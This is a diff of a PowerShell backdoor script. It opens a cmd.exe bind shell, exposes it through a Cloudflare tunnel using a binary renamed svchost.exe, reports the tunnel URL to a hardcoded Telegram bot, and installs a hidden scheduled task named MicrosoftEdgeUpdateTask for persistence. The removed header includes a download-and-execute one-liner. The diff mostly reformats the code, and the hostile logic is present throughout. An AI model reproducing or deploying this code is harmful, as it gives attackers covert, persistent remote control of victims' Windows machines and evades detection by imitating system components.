@@ -1,30 +1,16 @@
-#!/usr/bin/env pwsh
-<#
-.SYNOPSIS
-    Cloudflare Tunnel Reverse Shell for Windows (like gsocket) + Telegram notifications
-.DESCRIPTION
-    Creates a local bind shell, tunnels it through Cloudflare, and sends the URL via Telegram.
-    Includes persistence via scheduled task (hidden).
-    Usage: powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.ps1')"
-    Uninstall: $env:CF_UNINSTALL='<token>'; powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.ps1')"
-#>
-
 # ========== CONFIGURATION ==========
-$BIN_HIDDEN_NAME = "svchost.exe"               # Nama proses yang menyerupai sistem
-$CONFIG_DIR = "$env:USERPROFILE\.config\dbus"   # Direktori konfigurasi (tersembunyi)
-$TMPDIR = "$env:TEMP\.cf-$env:USERNAME"        # Direktori sementara
+$BIN_HIDDEN_NAME = "svchost.exe"
+$CONFIG_DIR = "$env:USERPROFILE\.config\dbus"
+$TMPDIR = "$env:TEMP\.cf-$env:USERNAME"
 $PORT = Get-Random -Minimum 10000 -Maximum 50000
 $TELEGRAM_BOT_TOKEN = "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
 $TELEGRAM_CHAT_ID = "6223261018"
 
-# ========== FUNCTIONS ==========
 function Send-Telegram {
     param([string]$Message)
     if ($TELEGRAM_BOT_TOKEN -and $TELEGRAM_BOT_TOKEN -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" -and $TELEGRAM_CHAT_ID) {
         $body = @{ chat_id = $TELEGRAM_CHAT_ID; text = $Message; parse_mode = "HTML" }
-        try {
-            Invoke-RestMethod -Uri "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue
-        } catch {}
+        try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue } catch {}
     }
 }
 
@@ -36,15 +22,11 @@ function Download-Cloudflared {
     param([string]$Arch)
     $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-$Arch.exe"
     $out = "$TMPDIR\cloudflared.exe"
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop
-        return $out
-    } catch { return $null }
+    try { Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop; return $out } catch { return $null }
 }
 
 function Start-BindShell {
     param([int]$Port)
-    # Membuat bind shell di localhost:Port dengan PowerShell (menjalankan cmd.exe)
     $scriptBlock = {
         param($port)
         $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Loopback, $port)
@@ -66,14 +48,8 @@ function Start-BindShell {
             $process.StandardInput.AutoFlush = $true
             $process.BeginOutputReadLine()
             $process.BeginErrorReadLine()
-            $process.OutputDataReceived += {
-                param($sender, $e)
-                if ($e.Data) { $writer.WriteLine($e.Data); $writer.Flush() }
-            }
-            $process.ErrorDataReceived += {
-                param($sender, $e)
-                if ($e.Data) { $writer.WriteLine($e.Data); $writer.Flush() }
-            }
+            $process.OutputDataReceived += { param($sender, $e) if ($e.Data) { $writer.WriteLine($e.Data); $writer.Flush() } }
+            $process.ErrorDataReceived += { param($sender, $e) if ($e.Data) { $writer.WriteLine($e.Data); $writer.Flush() } }
             while ($client.Connected) {
                 if ($stream.DataAvailable) {
                     $line = $reader.ReadLine()
@@ -125,7 +101,7 @@ function Start-Tunnel {
 
 function Create-Persistence {
     param([string]$ScriptPath)
-    $taskName = "MicrosoftEdgeUpdateTask"   # Nama mirip task sistem
+    $taskName = "MicrosoftEdgeUpdateTask"
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
     $trigger = New-ScheduledTaskTrigger -AtStartup
     $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest
@@ -140,15 +116,10 @@ function Remove-Persistence {
 
 function Uninstall {
     $tokenFile = "$CONFIG_DIR\.uninstall_token"
-    if (-not (Test-Path $tokenFile)) {
-        Write-Host "No installation found or token missing."; exit 1
-    }
+    if (-not (Test-Path $tokenFile)) { Write-Host "No installation found or token missing."; exit 1 }
     $storedToken = Get-Content $tokenFile -Raw
     $envToken = $env:CF_UNINSTALL
-    if (-not $envToken -or $envToken -ne $storedToken) {
-        Write-Host "Invalid uninstall token. Use `$env:CF_UNINSTALL=<token> and run script again."; exit 1
-    }
-    # Kill processes
+    if (-not $envToken -or $envToken -ne $storedToken) { Write-Host "Invalid uninstall token."; exit 1 }
     $confFile = "$CONFIG_DIR\tunnel.conf"
     if (Test-Path $confFile) {
         $conf = Get-Content $confFile | ConvertFrom-StringData
@@ -162,59 +133,29 @@ function Uninstall {
 }
 
 # ========== MAIN ==========
-# Uninstall mode
 if ($env:CF_UNINSTALL) { Uninstall }
-
-# Cek instalasi sebelumnya
-if (Test-Path "$CONFIG_DIR\.uninstall_token") {
-    Write-Host "Installation already detected. If you want to reinstall, first uninstall with the token."; exit 1
-}
-
-# Bersihkan & buat direktori
-Remove-Item -Recurse -Force $TMPDIR -ErrorAction SilentlyContinue
-New-Item -ItemType Directory -Path $TMPDIR -Force | Out-Null
-
+if (Test-Path "$CONFIG_DIR\.uninstall_token") { Write-Host "Already installed. Uninstall first."; exit 1 }
+Remove-Item -Recurse -Force $TMPDIR -ErrorAction SilentlyContinue; New-Item -ItemType Directory -Path $TMPDIR -Force | Out-Null
 Write-Host "Downloading binaries..."
 $arch = Get-Architecture
 $cfBin = Download-Cloudflared -Arch $arch
 if (-not $cfBin) { Write-Host "Failed to download cloudflared"; exit 1 }
-
-Write-Host "Copying binaries..."
-$installDir = "$CONFIG_DIR"
-if (-not (Test-Path $installDir)) { New-Item -ItemType Directory -Path $installDir -Force | Out-Null }
-$destBin = "$installDir\$BIN_HIDDEN_NAME"
-Copy-Item -Path $cfBin -Destination $destBin -Force
-
-Write-Host "Testing binaries..."
+$installDir = "$CONFIG_DIR"; New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+$destBin = "$installDir\$BIN_HIDDEN_NAME"; Copy-Item -Path $cfBin -Destination $destBin -Force
 & $destBin --version | Out-Null
 if ($LASTEXITCODE -ne 0) { Write-Host "Binary test failed"; exit 1 }
-
-Write-Host "Testing internet connectivity..."
-try {
-    Invoke-WebRequest -Uri https://cloudflare.com -UseBasicParsing -TimeoutSec 5 | Out-Null
-} catch { Write-Host "No internet connectivity? Continuing anyway..." }
-
-# Token uninstall
 $uninstallToken = -join ((48..57) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
 $uninstallToken | Out-File -FilePath "$installDir\.uninstall_token" -Encoding ascii
 Write-Host "To uninstall, set `$env:CF_UNINSTALL=$uninstallToken and run script again."
-
-# Start bind shell
 Write-Host "Starting bind shell on port $PORT..."
 $bindPid = Start-BindShell -Port $PORT
-
-# Start tunnel
 Write-Host "Starting tunnel..."
 $tunnelPid = Start-Tunnel -BinPath $destBin -Port $PORT
-
-# Simpan PID
 @"
 BIND_PID=$bindPid
 TUNNEL_PID=$tunnelPid
 PORT=$PORT
 "@ | Out-File -FilePath "$installDir\tunnel.conf" -Encoding ascii
-
-# Tunggu URL
 Start-Sleep -Seconds 5
 $logFile = "$TMPDIR\cloudflared.log"
 if (Test-Path $logFile) {
@@ -224,17 +165,13 @@ if (Test-Path $logFile) {
         Write-Host "✅ TUNNEL URL: $url" -ForegroundColor Green
         Write-Host "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
         Send-Telegram "<b>Initial Tunnel URL</b>`n$url"
-    } else { Write-Host "Tunnel URL not detected yet. Check $logFile" -ForegroundColor Yellow }
-} else { Write-Host "Log file not found." }
-
-# Persistence
+    } else { Write-Host "Tunnel URL not detected yet." -ForegroundColor Yellow }
+}
 $persistenceScript = $MyInvocation.MyCommand.Path
 if (-not $persistenceScript) {
-    $scriptUrl = "https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.ps1"
-    $persistenceScript = "$installDir\dep.ps1"
-    Invoke-WebRequest -Uri $scriptUrl -OutFile $persistenceScript -UseBasicParsing
+    $persistenceScript = "$installDir\win.ps1"
+    Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $persistenceScript -Force
 }
 Create-Persistence -ScriptPath $persistenceScript
 Write-Host "Persistence installed (scheduled task)."
-
 Write-Host "Done. Use CF_UNINSTALL=$uninstallToken to uninstall."
